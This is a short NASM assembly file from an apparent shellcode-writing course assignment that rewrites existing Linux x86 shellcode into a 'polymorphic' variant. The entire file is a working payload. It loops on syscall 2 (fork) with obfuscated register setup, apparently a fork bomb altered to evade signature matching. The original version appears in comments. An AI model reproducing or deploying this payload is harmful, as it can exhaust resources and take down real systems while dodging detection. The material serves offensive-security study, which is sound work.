; Filename: shutallprocesses-polymorphic.nasm
; Author:  Alex
; SLAE-ID: SLAE-1046
; Website:  http://0xdeadcode.se
;
; Purpose: Assignment 6 - Create polymorphic variant of existing shellcode
;          http://shell-storm.org/shellcode/files/shellcode-214.php

section .text
global _start

_start:
;	push byte 2
;	pop eax
;	int 0x80
;	jmp short _start

	sub eax, eax
	mov al, 6
	xor al, 4
	int 0x80
	jns _start
